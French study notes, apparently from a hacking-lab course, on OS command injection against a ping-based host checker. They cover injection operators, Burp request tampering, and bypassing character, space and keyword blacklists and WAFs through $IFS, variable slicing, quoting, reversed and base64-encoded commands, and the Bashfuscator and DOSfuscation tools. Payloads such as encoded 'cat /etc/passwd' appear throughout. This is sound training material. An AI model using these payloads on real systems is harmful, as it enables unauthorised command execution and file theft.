# Command Injection

## Principe

La détection des vulnérabilités basiques d’**OS Command Injection** suit le même processus que leur exploitation :  
on tente d’injecter une commande et on observe si la sortie diffère de l’exécution normale.  

Si le résultat change, la vulnérabilité est confirmée.  
Pour des injections plus complexes, il peut être nécessaire de fuzzing ou de revue de code.  

Ici, on se concentre sur les cas simples où l’entrée utilisateur est directement passée à une fonction système **sans aucune sanitation**.

## Exemple : Host Checker

L’application demande une adresse IP pour tester sa disponibilité.  

- En entrant `127.0.0.1`, la sortie renvoie un `ping` réussi.  
- On peut en déduire que la commande exécutée est :  

`ping -c 1 OUR_INPUT`

Si `OUR_INPUT` n’est pas filtré, on peut injecter d’autres commandes.

## Opérateurs d’injection

Pour chaîner ou détourner l’exécution, plusieurs opérateurs sont possibles :  

| Injection Operator | Injection Character | URL-Encoded | Exécution |
|--------------------|---------------------|-------------|-----------|
| Semicolon          | `;`                 | `%3b`       | Les deux commandes (Linux, PowerShell) |
| New Line           | `\n`                | `%0a`       | Les deux |
| Background         | `&`                 | `%26`       | Les deux (souvent le second output apparaît en premier) |
| Pipe               | `\|`                 | `%7c`       | Seulement la deuxième commande |
| AND                | `&&`                | `%26%26`    | Les deux (seulement si la première réussit) |
| OR                 | `\|\|`                | `%7c%7c`    | La deuxième (seulement si la première échoue) |
| Sub-Shell          | `` ` ` ``           | `%60%60`    | Les deux (Linux uniquement) |
| Sub-Shell          | `$( )`              | `%24%28%29` | Les deux (Linux uniquement) |


## Compatibilité

- Ces opérateurs fonctionnent **quel que soit le langage web (PHP, .NET, NodeJS…) ou l’OS serveur (Linux, Windows, macOS)**.  
- **Exception** : le `;` ne fonctionne pas avec **Windows CMD**, mais reste valide en **PowerShell**.

---

# Injecting Commands — Cheat Sheet (avec vérif DevTools)

## Payload minimal (chaînage `;`)
- Entrée à tester côté appli : `127.0.0.1; whoami`  
- Commande résultante : `ping -c 1 127.0.0.1; whoami`

## Test local rapide (optionnel)
- `ping -c 1 127.0.0.1; whoami` → vérifie que le chaînage produit bien deux sorties.

## Vérifier si la validation est client-side (DevTools)
1. Ouvrir DevTools → onglet **Network**.
2. Saisir une IP valide dans le champ, cliquer **Check**.
3. Remplacer l’IP par `127.0.0.1; whoami`, recliquer **Check**.
4. **Signal faible de client-side only** : aucun nouveau request/entry dans **Network**, mais un message d’erreur côté UI (regex IP, etc.).  
   ⇒ La requête n’est pas envoyée → filtrage uniquement front-end, contournable.

## Contournement via proxy (Burp/ZAP)
1. Intercepter une requête valide (ex. IP `127.0.0.1`).
2. Envoyer en **Repeater** et modifier le paramètre (ex. `ip=127.0.0.1;whoami`).
3. URL-encoder les caractères spéciaux si nécessaire (ex. `;` → `%3B`).
4. Envoyer la requête et inspecter la réponse.

### Exemple minimal de requête
Méthode : `POST`  
Body : `ip=127.0.0.1%3Bwhoami`  
Résultat attendu : sortie du `ping` **et** sortie de `whoami` dans la réponse → injection confirmée.

## Remarques utiles
- Si `;` est neutralisé côté Windows **CMD**, tester `&`, `|`, `&&`, `||` (en les encodant si besoin).  
- Toujours encoder dans Repeater pour éviter des blocages côté WAF/parseur.  
- La validation front-end n’empêche pas l’injection si le back-end ne filtre/sanitise pas l’entrée.

---
# Other Injection Operators

## AND Operator (`&&`)
- Payload : `127.0.0.1 && whoami`  
- Command exécutée : `ping -c 1 127.0.0.1 && whoami`  
- Exécute la 2ᵉ commande **seulement si la 1ʳᵉ réussit**.  
- Exemple Burp (encodage URL) : `127.0.0.1%26%26whoami`  
- Résultat attendu : sortie du `ping` + sortie de `whoami`.

## OR Operator (`||`)
- Payload : `127.0.0.1 || whoami`  
- Command exécutée : `ping -c 1 127.0.0.1 || whoami`  
- Exécute la 2ᵉ commande **seulement si la 1ʳᵉ échoue**.  
- Avec une IP valide → seule la 1ʳᵉ commande tourne.  
- Pour forcer : ne rien mettre avant `||` → `|| whoami`.  
- Exemple Burp (encodage URL) : `%7C%7Cwhoami`  
- Résultat attendu : erreur du `ping`, puis sortie de `whoami`.

## Résumé des opérateurs utiles

| Type d’injection                  | Opérateurs fréquents |
|----------------------------------|----------------------|
| **SQL Injection**                | `'` , `;` , `--` , `/* */` |
| **Command Injection**            | `;` , `&&` , `&` , `\|\|` , `\|` |
| **LDAP Injection**               | `*` , `()` , `&` , `\|` |
| **XPath Injection**              | `'` , `or` , `and` , `not` , `substring` , `concat` , `count` |
| **OS Command Injection**         | `;` , `&` , `\|` |
| **Code Injection**               | `'` , `;` , `--` , `/* */` , `$()` , `${}` , `#{}` , `%{}` , `^` |
| **Directory Traversal / Path**   | `../` , `..\\` , `%00` |
| **Object Injection**             | `;` , `&` , `\|` |
| **XQuery Injection**             | `'` , `;` , `--` , `/* */` |
| **Shellcode Injection**          | `\x` , `\u` , `%u` , `%n` |
| **Header Injection**             | `\n` , `\r\n` , `\t` , `%0d` , `%0a` , `%09` |


## Notes pratiques
- Toujours tester en local avant d’envoyer via Burp/ZAP.  
- Encoder les opérateurs (`&&` → `%26%26`, `||` → `%7C%7C`, etc.).  
- Chaque opérateur a un comportement spécifique → choisir selon le besoin (ex. forcer erreur → `||`).  

---

# Identifying Filters

## Contexte
- Les devs peuvent tenter de bloquer les injections via **caractères interdits** ou **mots interdits**.  
- Une couche supplémentaire peut être un **WAF** (Web Application Firewall).  
- Symptômes :  
  - Message **"Invalid input"** généré par l’appli → blacklist côté back-end.  
  - Page différente (IP + requête affichée) → blocage par **WAF**.

## Exemple de payload bloqué
`127.0.0.1; whoami`  

⚠️ Potentiellement bloqué à cause de :  
- `;` (séparateur de commande)  
- ` ` (espace)  
- `whoami` (mot clé interdit)

## Blacklisted Characters
Exemple de code côté serveur (PHP) :

`$blacklist = ['&', '|', ';', ...];  
foreach ($blacklist as $character) {  
&nbsp;&nbsp;&nbsp;&nbsp;if (strpos($_POST['ip'], $character) !== false) {  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "Invalid input";  
&nbsp;&nbsp;&nbsp;&nbsp;}  
}`

- Si **un seul caractère match** → la requête est refusée.  
- Objectif : **identifier quel caractère déclenche le blocage**.

## Méthode d’identification
1. **Tester un caractère à la fois** :  
   - Payload `127.0.0.1;` → **bloqué** → `;` est blacklisté.  
   - Répéter avec `&`, `|`, `&&`, `||`, etc.  
2. **Comparer la réponse** :  
   - Si `Invalid input` → caractère détecté.  
   - Si normal → caractère autorisé.  

---

# Bypassing Space Filters

## Contexte
- Les opérateurs classiques (`;`, `&&`, `||`, etc.) sont souvent **blacklistés**.  
- Le **saut de ligne** (`\n` → `%0a`) est rarement bloqué → peut servir d’opérateur d’injection.  
- Mais même avec `%0a`, si l’espace est blacklisté, la requête échoue.  
- Objectif : injecter **sans utiliser de vrais espaces**.

## Payloads testés

- Test opérateur injection :  
  `127.0.0.1%0a` → **OK** (ping fonctionne)  
- Ajout d’espace :  
  `127.0.0.1%0a whoami` → **bloqué** → l’espace est blacklisté.  

## Techniques de contournement

### 1. Tabs (`%09`)
- Linux & Windows acceptent `tab` comme séparateur d’arguments.  
- Exemple :  
  `127.0.0.1%0a%09whoami`  
- Résultat : **OK** → bypass réussi.

### 2. Variable d’environnement `$IFS`
- `$IFS` (Internal Field Separator) = espace + tab.  
- Substitué automatiquement en espace lors de l’exécution.  
- Exemple :  
  `127.0.0.1%0a${IFS}whoami`  
- Résultat : **OK** → bypass réussi.

### 3. Brace Expansion (bash)
- Bash insère des séparateurs automatiquement.  
- Exemple direct :  
  `{ls,-la}` → équivalent à `ls -la`  
- Injection :  
  `127.0.0.1%0a{ls,-la}`  
- Résultat : commande exécutée sans utiliser d’espace.  

## Ressource utile
- [PayloadsAllTheThings — Commands without spaces](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypassing-space-filters)  

---

# Bypassing Other Blacklisted Characters

## Contexte
- Slash `/` et backslash `\` sont souvent **blacklistés** (utiles pour chemins).  
- Objectif : générer ces caractères (ou d’autres comme `;`) **sans les taper directement**.

## Linux

### 1. Extraire caractères depuis variables d’environnement
Exemple avec `$PATH` :  
`/usr/local/bin:/usr/bin:/bin:/usr/games`

- Slash `/` depuis `$PATH`:  
  `echo ${PATH:0:1}` → `/`  

- Slash `/` depuis `$HOME` ou `$PWD`:  
  `echo ${HOME:0:1}` → `/`  

- Point-virgule `;` depuis `$LS_COLORS`:  
  `echo ${LS_COLORS:10:1}` → `;`

Exemple de payload :  
`127.0.0.1${LS_COLORS:10:1}${IFS}whoami`  
→ Injecte `; whoami` sans utiliser `;` ou espace directement.

### 2. Character Shifting (via `tr`)
- Trouver caractère avant la cible dans ASCII (`man ascii`).  
  - `\` est 92 → caractère avant `[` (91).  
- Payload :  
  `echo $(tr '!-}' '"-~'<<<[)` → `\`

## Windows

### 1. CMD avec variables + substring
- `%HOMEPATH%` → `\Users\htb-student`  
- Payload pour isoler `\` :  
  `echo %HOMEPATH:~6,-11%` → `\`

### 2. PowerShell (variables comme arrays)
- `$env:HOMEPATH[0]` → `\`  
- `$env:PROGRAMFILES[10]` → caractère à l’index 10  

Lister toutes les variables dispo :  
`Get-ChildItem Env:`

## Notes pratiques
- **Linux** : `${VAR:start:length}`  
- **Windows CMD** : `%VAR:~start,end%`  
- **PowerShell** : `$env:VAR[index]`  
- **ASCII tricks** : utiliser `tr` pour décaler vers caractère cible.  

---

# Bypassing Blacklisted Commands

## Contexte
- Certaines applis bloquent des **mots-clés** (`whoami`, `cat`, etc.) → **command blacklist**.  
- Objectif : **obfusquer** nos commandes pour contourner la détection.  
- Astuce : les shells (bash, PowerShell, CMD) ignorent certains caractères insérés dans un mot.

## Exemple de filtre côté serveur (PHP)
`$blacklist = ['whoami', 'cat', ...];  
foreach ($blacklist as $word) {  
&nbsp;&nbsp;&nbsp;&nbsp;if (strpos($_POST['ip'], $word) !== false) {  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "Invalid input";  
&nbsp;&nbsp;&nbsp;&nbsp;}  
}`

➡️ Vérifie correspondance exacte du mot → obfuscation = bypass possible.

## Techniques d’obfuscation

### 1. Quotes (Linux & Windows)
- Insertion de `'` ou `"` au milieu des caractères.  
- ⚠️ Ne pas mélanger les deux types, et nombre de quotes doit être pair.  

Exemples :  
- `w'h'o'am'i` → `whoami`  
- `w"h"o"am"i` → `whoami`  

Payload :  
`127.0.0.1%0aw'h'o'am'i`

### 2. Linux-only
- Caractères tolérés par **bash** :  
  - `\` (backslash)  
  - `$@` (paramètres positionnels)  

Exemples :  
- `who$@ami` → `whoami`  
- `w\ho\am\i` → `whoami`

### 3. Windows-only
- Caractère **caret** `^` → ignoré par CMD.  

Exemple :  
- `who^ami` → `whoami`

- Si un caractère utilisé (`'`, `"`, `\`, `^`, `$@`) est blacklisté → combiner avec les méthodes vues pour **caractères interdits** (`${VAR:x:y}`, `$IFS`, `%09`, etc.).  

---

# Advanced Command Obfuscation

## Objectif
- Contourner les **WAFs** et filtres avancés.  
- Utiliser des techniques d’**obfuscation** pour changer l’apparence des commandes sans en briser l’exécution.  

## 1. Case Manipulation

### Windows (case-insensitive)
- `WhOaMi` → fonctionne comme `whoami`.

### Linux (case-sensitive)
- Transformer en minuscules avec `tr`:  
  `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` → `whoami`  
- Alternative sans espaces :  
  `$(a="WhOaMi";printf %s "${a,,}")`

⚠️ Attention aux espaces → remplacer par `%09` (tab).

## 2. Reversed Commands

### Linux
- Obtenir chaîne inversée :  
  `echo 'whoami' | rev` → `imaohw`  
- Exécuter en inversant à la volée :  
  `$(rev<<<'imaohw')` → `whoami`

### Windows (PowerShell)
- Inverser chaîne :  
  `"whoami"[-1..-20] -join ''` → `imaohw`  
- Exécuter via sub-shell :  
  `iex "$('imaohw'[-1..-20] -join '')"`

## 3. Encoded Commands

### Linux — Base64
- Encoder :  
  `echo -n 'cat /etc/passwd | grep 33' | base64`  
  → `Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==`

- Exécuter :  
  `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`

⚠️ Utilisation de `<<<` pour éviter le `|` filtré.

### Windows — Base64
- Encoder :  
  `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`  
  → `dwBoAG8AYQBtAGkA`

- Exécuter :  
  `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`


## Notes pratiques
- **Case manipulation** : simple, mais attention aux filtres.  
- **Reversed commands** : ne contient jamais la commande originale en clair.  
- **Encoded commands** : idéal quand des caractères sensibles sont filtrés.  
- Alternatives si `bash` ou `base64` sont filtrés :  
  - `sh` au lieu de `bash`  
  - `openssl` ou `xxd` pour décodage  

## Ressources
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)  

---

# Evasion Tools

## Objectif
Automatiser l’obfuscation des commandes pour contourner les filtres avancés ou WAFs.  
➡️ Exemple Linux : **Bashfuscator**  
➡️ Exemple Windows : **DOSfuscation**

## Linux — Bashfuscator

### Installation
- `git clone https://github.com/Bashfuscator/Bashfuscator`  
- `cd Bashfuscator`  
- `pip3 install setuptools==65`  
- `python3 setup.py install --user`

### Utilisation basique
- `cd ./bashfuscator/bin/`  
- `./bashfuscator -h` → affiche le menu d’aide  
- `./bashfuscator -c 'cat /etc/passwd'`

⚠️ Génère parfois des payloads énormes (parfois >1M caractères).

### Version simplifiée
- `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`

Exemple de sortie :  
`eval "$(W0=(w \  t e c p s a \/ d);for Ll in ...;{ printf %s "${W0[$Ll]}";};)"`

## Windows — DOSfuscation

### Installation
- `git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git`  
- `cd Invoke-DOSfuscation`  
- `Import-Module .\Invoke-DOSfuscation.psd1`  
- `Invoke-DOSfuscation`

### Menu interactif
- `help` → affiche l’aide  
- Options :  
  - **BINARY** → syntaxe obfusquée pour cmd.exe / powershell.exe  
  - **ENCODING** → encodage via variables d’environnement  
  - **PAYLOAD** → obfuscation directe de payload  

### Exemple
```
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

Sortie générée :  
`typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu...`


## Notes pratiques
- **Bashfuscator** → Linux, combine quotes, variables, reverse, encodage.  
- **DOSfuscation** → Windows (CMD & PowerShell), encodage via variables.  
- Utiles quand les techniques manuelles (quotes, IFS, base64, etc.) échouent.

## Ressources
- [Bashfuscator — GitHub](https://github.com/Bashfuscator/Bashfuscator)  
- [Invoke-DOSfuscation — GitHub](https://github.com/danielbohannon/Invoke-DOSfuscation)

---
